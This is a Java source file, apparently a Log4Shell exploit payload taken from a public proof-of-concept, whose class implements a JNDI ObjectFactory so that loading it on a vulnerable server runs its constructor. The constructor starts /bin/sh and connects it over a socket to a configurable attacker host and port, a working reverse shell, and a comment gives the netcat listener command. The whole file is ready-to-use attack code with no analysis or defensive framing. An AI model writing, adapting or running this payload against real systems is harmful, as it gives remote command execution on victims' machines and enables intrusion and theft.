import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;

/**
 * <p>Shamelessly taken from https://github.com/kozmer/log4j-shell-poc/</p>
 * <p>How to setup remote shell: nc -l 9001</p>
 */
public class RemoteShell implements javax.naming.spi.ObjectFactory {

    private static final String SHELL_EXECUTABLE = "/bin/sh";

    /**
     * The address to the remote shell proxy. This needs to be on a IP accessible to the target
     * host.
     */
    private String host = "${exploit.remoteshell.host}";

    /**
     * Listening port of the remote shell.
     */
    private int port = Integer.parseInt("${exploit.remoteshell.port}");

    public RemoteShell() throws Exception {
        Process p = new ProcessBuilder(SHELL_EXECUTABLE).redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(),
            pe = p.getErrorStream(),
            si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {
            while (pi.available() > 0) {
                so.write(pi.read());
            }
            while (pe.available() > 0) {
                so.write(pe.read());
            }
            while (si.available() > 0) {
                po.write(si.read());
            }
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            } catch (Exception e) {
            }
        }

        p.destroy();
        s.close();
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx,
        Hashtable<?, ?> environment) {
        return null;
    }
}
